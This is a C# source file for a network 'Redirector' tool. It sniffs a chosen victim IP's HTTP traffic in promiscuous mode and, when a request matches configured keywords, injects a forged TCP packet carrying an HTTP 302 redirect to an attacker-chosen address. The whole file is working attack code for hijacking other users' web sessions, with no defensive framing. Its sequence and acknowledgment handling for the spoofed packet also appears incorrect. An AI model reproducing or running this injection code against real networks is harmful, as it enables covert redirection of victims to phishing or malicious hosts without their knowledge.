using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using System.IO;
using System.Net.NetworkInformation;

namespace Rt
{
    public class Redirector
    {
        private readonly IPAddress targetIp;
        private readonly IPAddress redirectIp;
        private readonly List<string> keywordsList = new List<string>();
        private readonly Dictionary<string, int> connIndex = new Dictionary<string, int>();
        private readonly LibPcapLiveDevice? captureDevice;
        private const int HTTPPORT = 80;
        
        public Redirector(IPAddress target, IPAddress redirect)
        {
            Console.WriteLine($"Redirector 初始化，目标 IP: {target}, 重定向 IP: {redirect}");
            targetIp = target;
            redirectIp = redirect;
            
            // 使用默认网卡
            try 
            {
                var devices = LibPcapLiveDeviceList.Instance;
                if (devices.Count > 0)
                {
                    captureDevice = devices[0];
                    Console.WriteLine($"Redirector 使用网络设备: {captureDevice.Description}");
                }
                else
                {
                    Console.WriteLine("Redirector 未找到网络设备");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Redirector 初始化网络设备时出错: {ex.Message}");
            }
        }

        public void AddKeyword(string keyword)
        {
            if (!string.IsNullOrWhiteSpace(keyword) && !keywordsList.Contains(keyword))
            {
                Console.WriteLine($"Redirector 添加关键词: {keyword}");
                keywordsList.Add(keyword);
            }
        }

        public void Start()
        {
            Console.WriteLine("Redirector 开始初始化捕获...");
            
            if (captureDevice == null)
            {
                Console.WriteLine("Redirector 无法启动: 捕获设备为空");
                return;
            }
            
            try
            {
                if (!captureDevice.Opened)
                {
                    captureDevice.Open(DeviceModes.Promiscuous);
                    Console.WriteLine("Redirector 打开捕获设备，设置为混杂模式");
                }
                
                // 设置过滤器只捕获来自目标IP的HTTP流量
                string filter = $"tcp and src host {targetIp} and dst port {HTTPPORT}";
                Console.WriteLine($"Redirector 设置过滤器: {filter}");
                captureDevice.Filter = filter;
                
                // 设置数据包到达事件处理器
                captureDevice.OnPacketArrival += Device_OnPacketArrival;
                
                // 启动捕获
                Console.WriteLine("Redirector 开始数据包捕获");
                captureDevice.StartCapture();
                Console.WriteLine("Redirector 数据包捕获已成功启动");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Redirector 启动捕获时出错: {ex.Message}");
                try { captureDevice.Close(); } catch { }
            }
        }

        public void Stop()
        {
            Console.WriteLine("Redirector 停止捕获...");
            
            if (captureDevice != null && captureDevice.Opened)
            {
                try
                {
                    captureDevice.StopCapture();
                    captureDevice.Close();
                    Console.WriteLine("Redirector 捕获已停止");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Redirector 停止捕获时出错: {ex.Message}");
                }
            }
        }

        private void Device_OnPacketArrival(object sender, PacketCapture e)
        {
            try
            {
                var rawPacket = e.GetPacket();
                var packet = PacketDotNet.Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);
                
                // 检查是否是TCP包
                if (!(packet is EthernetPacket ethernetPacket))
                {
                    return;
                }
                
                var ipPacket = ethernetPacket.PayloadPacket as IPPacket;
                if (ipPacket == null)
                {
                    return;
                }
                
                var tcpPacket = ipPacket.PayloadPacket as TcpPacket;
                if (tcpPacket == null || tcpPacket.DestinationPort != HTTPPORT)
                {
                    return;
                }
                
                // 确保包来自目标IP
                if (!ipPacket.SourceAddress.Equals(targetIp))
                {
                    return;
                }
                
                // 提取数据
                byte[] payloadData = tcpPacket.PayloadData;
                if (payloadData == null || payloadData.Length == 0)
                {
                    return;
                }
                
                // 尝试将数据转换为字符串
                string data = Encoding.ASCII.GetString(payloadData);
                
                // 检查是否是HTTP请求
                if (data.StartsWith("GET ") || data.StartsWith("POST "))
                {
                    Console.WriteLine($"捕获到HTTP请求: {data.Split('\r', '\n')[0]}");
                    
                    // 检查关键词
                    bool containsKeyword = false;
                    string matchedKeyword = string.Empty;
                    
                    foreach (var keyword in keywordsList)
                    {
                        if (data.Contains(keyword, StringComparison.OrdinalIgnoreCase))
                        {
                            containsKeyword = true;
                            matchedKeyword = keyword;
                            break;
                        }
                    }
                    
                    if (containsKeyword)
                    {
                        Console.WriteLine($"HTTP请求包含关键词: {matchedKeyword}，准备重定向");
                        
                        // 构建会话标识
                        string sessionKey = $"{ipPacket.SourceAddress}:{tcpPacket.SourcePort}-{ipPacket.DestinationAddress}:{tcpPacket.DestinationPort}";
                        
                        // 如果是新会话，发送重定向响应
                        if (!connIndex.ContainsKey(sessionKey))
                        {
                            Console.WriteLine($"为会话 {sessionKey} 发送重定向响应");
                            connIndex[sessionKey] = 1;
                            
                            // 构建HTTP 301/302重定向响应
                            string redirectUrl = $"http://{redirectIp}/";
                            string httpResponse = 
                                "HTTP/1.1 302 Found\r\n" +
                                $"Location: {redirectUrl}\r\n" +
                                "Content-Length: 0\r\n" +
                                "Connection: close\r\n" +
                                "\r\n";
                            
                            // 发送重定向响应
                            SendTcpPacket(
                                ethernetPacket.DestinationHardwareAddress,
                                ethernetPacket.SourceHardwareAddress,
                                ipPacket.DestinationAddress,
                                ipPacket.SourceAddress,
                                tcpPacket.DestinationPort,
                                tcpPacket.SourcePort,
                                tcpPacket.SequenceNumber,
                                tcpPacket.AcknowledgmentNumber,
                                httpResponse
                            );
                            
                            Console.WriteLine($"重定向响应已发送到 {ipPacket.SourceAddress}:{tcpPacket.SourcePort}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"处理数据包时出错: {ex.Message}");
            }
        }
        
        private void SendTcpPacket(
            PhysicalAddress srcMac,
            PhysicalAddress dstMac, 
            IPAddress srcIp,
            IPAddress dstIp,
            ushort srcPort,
            ushort dstPort,
            uint seqNum,
            uint ackNum,
            string payload)
        {
            try
            {
                Console.WriteLine($"构建TCP数据包: {srcIp}:{srcPort} -> {dstIp}:{dstPort}");
                
                // 确保捕获设备已打开
                if (captureDevice == null || !captureDevice.Opened)
                {
                    Console.WriteLine("无法发送数据包: 捕获设备未打开");
                    return;
                }
                
                // 创建以太网包
                var ethernetPacket = new EthernetPacket(
                    sourceHardwareAddress: srcMac,
                    destinationHardwareAddress: dstMac,
                    EthernetType.IPv4);
                
                // 创建IP包
                var ipPacket = new IPv4Packet(srcIp, dstIp);
                
                // 设置IP包头部
                ipPacket.Protocol = PacketDotNet.ProtocolType.Tcp;
                ipPacket.TimeToLive = 64;
                
                // 创建TCP包
                var tcpPacket = new TcpPacket(srcPort, dstPort);
                
                // 设置TCP包头部
                tcpPacket.SequenceNumber = seqNum;
                tcpPacket.AcknowledgmentNumber = ackNum;
                tcpPacket.Acknowledgment = true;
                tcpPacket.Push = true;
                tcpPacket.WindowSize = 64240;
                
                // 设置负载
                var payloadBytes = Encoding.ASCII.GetBytes(payload);
                tcpPacket.PayloadData = payloadBytes;
                
                // 组装包
                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;
                
                // 更新包长度和校验和
                tcpPacket.UpdateCalculatedValues();
                ipPacket.UpdateCalculatedValues();
                
                // 发送数据包
                Console.WriteLine($"发送数据包，大小: {ethernetPacket.Bytes.Length} 字节");
                captureDevice.SendPacket(ethernetPacket.Bytes);
                Console.WriteLine("数据包发送成功");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"发送TCP数据包时出错: {ex.Message}");
            }
        }
    }
} 